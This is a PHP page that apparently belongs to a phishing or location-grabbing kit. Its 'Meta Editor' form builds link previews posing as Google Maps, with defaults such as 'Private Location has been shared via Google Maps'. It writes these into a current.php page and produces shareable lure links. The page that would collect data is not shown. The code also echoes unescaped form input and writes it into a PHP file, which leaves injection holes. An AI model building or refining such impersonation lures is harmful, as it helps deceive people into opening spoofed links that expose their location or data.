    <title>https://maps.google.ca/shared/location</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Share your location now with Googles Meta Go!">
    <meta property="og:image" content="https://i.ibb.co/X3w2Gy7/current.png">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Google Maps - Current Location">
    <meta property="og:locale" content="en_US">
    <meta property="og:button" content="Live location">
    <meta property="og:button:url" content="Maps">
    <meta charset="utf-8">
    <meta name="title" content="Google Maps">
    <meta name="robots" content="index, nofollow">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="language" content="English">
    <meta name="revisit-after" content="10 days">
    <meta name="author" content="Google">
    <meta property="og:description" content="https://i.ibb.co/X3w2Gy7/current.png">
    <meta property="og:image:width" content="200">
    <meta property="og:image:height" content="200">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:description" content="Share your location now with Googles Meta Go!">
    <meta name="twitter:image" content="https://i.ibb.co/X3w2Gy7/current.png">
    <meta name="twitter:image:width" content="200">
    <meta name="twitter:image:height" content="200">
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $title = $_POST['title'] ?? 'Current Location';
    $description = $_POST['description'] ?? 'Private Location has been shared via Google Maps';
    $imageURL = $_POST['imageURL'] ?? 'https://i.ibb.co/X3w2Gy7/current.png';
    $previewWidth = $_POST['previewWidth'] ?? 200;
    $previewHeight = $_POST['previewHeight'] ?? 200;
    $content = $_POST['content'] ?? 'map';

    // Update the current.php file
    $file = 'maps/Google/current.php';
    $contentTemplate = file_get_contents('content_template.php');
    $metaTags = '';
    if ($content === 'website') {
        $metaTags = file_get_contents('website_meta_tags.php');
    } elseif ($content === 'map') {
        $metaTags = file_get_contents('map_meta_tags.php');
    }
    $content = str_replace('<!-- META_TAGS -->', $metaTags, $contentTemplate);
    $content = str_replace('<!-- TITLE -->', $title, $content);
    $content = str_replace('<!-- DESCRIPTION -->', $description, $content);
    $content = str_replace('<!-- IMAGE_URL -->', $imageURL, $content);
    $content = str_replace('<!-- PREVIEW_WIDTH -->', $previewWidth, $content);
    $content = str_replace('<!-- PREVIEW_HEIGHT -->', $previewHeight, $content);

    // Write the updated content back to the file
    file_put_contents($file, $content);

    // Generate a shareable link with encrypted parameters
    $params = [
        'title' => $title,
        'description' => $description,
        'imageURL' => $imageURL,
        'previewWidth' => $previewWidth,
        'previewHeight' => $previewHeight,
        'content' => $content
    ];

    $encryptedParams = base64_encode(json_encode($params));
    $shareURL = 'https://' . $_SERVER['HTTP_HOST'] . '/maps/Google/current.php?params=' . urlencode($encryptedParams);
}
?>

<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #222;
            color: #fff;
        }

        .container {
            margin-top: 50px;
        }

        .form-group label {
            color: #fff;
        }

        .form-control {
            background-color: #333;
            color: #fff;
            border-color: #444;
        }

        .btn-primary {
            background-color: #007bff;
            border-color: #007bff;
        }

        .btn-primary:hover {
            background-color: #0069d9;
            border-color: #0062cc;
        }

        .btn-success {
            background-color: #28a745;
            border-color: #28a745;
        }

        .btn-success:hover {
            background-color: #218838;
            border-color: #1e7e34;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Meta Editor</h1>
        <form method="post" action="">
            <div class="form-group">
                <label for="title">Title:</label>
                <input type="text" class="form-control" id="title" name="title" value="<?php echo $_POST['title'] ?? 'Current Location'; ?>">
            </div>
            <div class="form-group">
                <label for="description">Description:</label>
                <textarea class="form-control" id="description" name="description"><?php echo $_POST['description'] ?? 'Private Location has been shared via Google Maps'; ?></textarea>
            </div>
            <div class="form-group">
                <label for="imageURL">Image URL:</label>
                <input type="text" class="form-control" id="imageURL" name="imageURL" value="<?php echo $_POST['imageURL'] ?? 'https://i.ibb.co/X3w2Gy7/current.png'; ?>">
            </div>
            <div class="form-group">
                <label for="previewWidth">Preview Width:</label>
                <input type="number" class="form-control" id="previewWidth" name="previewWidth" value="<?php echo $_POST['previewWidth'] ?? 200; ?>">
            </div>
            <div class="form-group">
                <label for="previewHeight">Preview Height:</label>
                <input type="number" class="form-control" id="previewHeight" name="previewHeight" value="<?php echo $_POST['previewHeight'] ?? 200; ?>">
            </div>
            <div class="form-group">
                <label for="content">Content Type:</label>
                <select class="form-control" id="content" name="content">
                    <option value="website" <?php echo ($_POST['content'] ?? 'map') === 'website' ? 'selected' : ''; ?>>Website</option>
                    <option value="map" <?php echo ($_POST['content'] ?? 'map') === 'map' ? 'selected' : ''; ?>>Map</option>
                </select>
            </div>
            <button type="submit" class="btn btn-primary">Update Meta Data</button>
            <?php if (!empty($shareURL)) : ?>
                <button type="button" class="btn btn-success" onclick="generateShareURL()">Share Now</button>
                <button type="button" class="btn btn-secondary" onclick="copyURL()">Copy</button>
            <?php endif; ?>
        </form>

        <?php if (!empty($shareURL)) : ?>
            <hr>
            <h4>Shareable Link:</h4>
            <div class="input-group mb-3">
                <input type="text" id="shareURL" class="form-control" value="<?php echo $shareURL; ?>">
                <div class="input-group-append">
                    <button class="btn btn-primary" type="button" onclick="copyURL()">Copy</button>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        function generateShareURL() {
            var title = document.getElementById('title').value;
            var description = document.getElementById('description').value;
            var imageURL = document.getElementById('imageURL').value;
            var previewWidth = document.getElementById('previewWidth').value;
            var previewHeight = document.getElementById('previewHeight').value;
            var content = document.getElementById('content').value;

            var params = {
                title: title,
                description: description,
                imageURL: imageURL,
                previewWidth: previewWidth,
                previewHeight: previewHeight,
                content: content
            };

            var encryptedParams = btoa(JSON.stringify(params));
            var shareURL = 'https://' + window.location.hostname + '/maps/Google/current.php?params=' + encodeURIComponent(encryptedParams);

            document.getElementById('shareURL').value = shareURL;
        }

        function copyURL() {
            var shareURL = document.getElementById('shareURL');
            shareURL.select();
            shareURL.setSelectionRange(0, 99999);
            document.execCommand('copy');
        }
    </script>
</body>
</html>
